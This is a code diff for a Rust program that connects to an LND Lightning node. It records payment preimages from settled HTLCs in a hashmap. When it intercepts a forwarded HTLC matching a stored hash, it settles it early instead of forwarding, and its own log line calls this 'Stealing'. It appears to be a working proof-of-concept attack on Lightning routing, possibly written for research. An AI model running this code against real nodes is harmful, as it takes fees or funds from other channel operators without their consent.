@@ -2,6 +2,7 @@
 
 use std::collections::HashMap;
 use std::sync::Arc;
+
 use sha2::Digest;
 use sha2::Sha256;
 use tokio::sync::Mutex;
@@ -50,11 +51,13 @@ async fn main() {
     // the response to get the message.
     println!("{:#?}", info.alias);
 
+    // hashmap storing preimages and their hashes
     let hash_map: Arc<Mutex<HashMap<Vec<u8>, Vec<u8>>>> = Arc::new(Mutex::new(HashMap::new()));
 
     // HTLC event stream part
     println!("starting htlc event subscription");
     let mut client_router_htlc_event = client_router.clone();
+    let hash_map_htlc_event = hash_map.clone();
     spawn(async move {
         let mut htlc_event_stream = client_router_htlc_event
             .subscribe_htlc_events(tonic_openssl_lnd::routerrpc::SubscribeHtlcEventsRequest {})
@@ -69,18 +72,24 @@ async fn main() {
         {
             println!("{:#?}", htlc_event);
             if let Some(event) = htlc_event.event {
-                match event {
-                    tonic_openssl_lnd::routerrpc::htlc_event::Event::SettleEvent(settle_event) => {
-                        let mut hasher = Sha256::new();
-                        hasher.update(&settle_event.preimage);
-                        let payment_hash = hasher.finalize();
-                        println!(
-                            "got preimage {} from payment hash {}",
-                            hex::encode(settle_event.preimage),
-                            hex::encode(payment_hash)
-                        )
-                    }
-                    _ => {}
+                if let tonic_openssl_lnd::routerrpc::htlc_event::Event::SettleEvent(settle_event) =
+                    event
+                {
+                    let mut hasher = Sha256::new();
+                    hasher.update(&settle_event.preimage);
+                    let payment_hash = hasher.finalize();
+                    println!(
+                        "got preimage {} from payment hash {}",
+                        hex::encode(settle_event.preimage.clone()),
+                        hex::encode(payment_hash)
+                    );
+
+                    let _already_inserted = hash_map_htlc_event
+                        .clone()
+                        .lock()
+                        .await
+                        .insert(payment_hash.to_vec(), settle_event.preimage);
+                    ()
                 };
             }
         }
@@ -116,17 +125,17 @@ async fn main() {
                     println!("HTLC preimage saved! Stealing...");
                     tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                         incoming_circuit_key: htlc.incoming_circuit_key,
-                        action: 0,        // 0 settle, 1 fail, 2 resume
+                        action: 0, // 0 settle, 1 fail, 2 resume
                         preimage: preimage.to_vec(),
                         failure_code: 0,
                         failure_message: vec![],
                     }
-                },
+                }
                 None => {
                     println!("Do not have HTLC preimage, resuming");
                     tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                         incoming_circuit_key: htlc.incoming_circuit_key,
-                        action: 2,        // 0 settle, 1 fail, 2 resume
+                        action: 2, // 0 settle, 1 fail, 2 resume
                         preimage: vec![],
                         failure_code: 0,
                         failure_message: vec![],
